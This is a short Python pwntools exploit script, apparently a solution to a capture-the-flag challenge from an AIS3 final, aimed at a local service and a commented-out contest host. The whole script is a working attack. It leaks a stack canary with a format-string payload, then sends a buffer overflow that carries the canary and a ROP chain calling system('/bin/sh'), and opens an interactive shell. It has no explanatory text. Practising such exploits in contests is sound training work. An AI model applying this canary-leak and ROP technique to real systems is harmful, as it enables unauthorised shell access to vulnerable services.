#!/usr/bin/python
from pwn import *
import re

s = remote('127.0.0.1',4000)  # for local testing
#s = remote('final.ais3.org',32164)

system = 0x0000000000400630
pop_rdi_ret = 0x0000000000400903
binsh = 0x400928

print s.recv()

payload = '<%11$lx>'
s.sendline(payload)

rst = s.recv()

canary = int(re.findall(r'<(.*)>',rst)[0],16)

payload = 'A'*24 + p64(canary) + 'B'*8 + p64(pop_rdi_ret) + p64(binsh) + p64(system)
s.sendline(payload)

s.sendline('quit')

s.interactive()
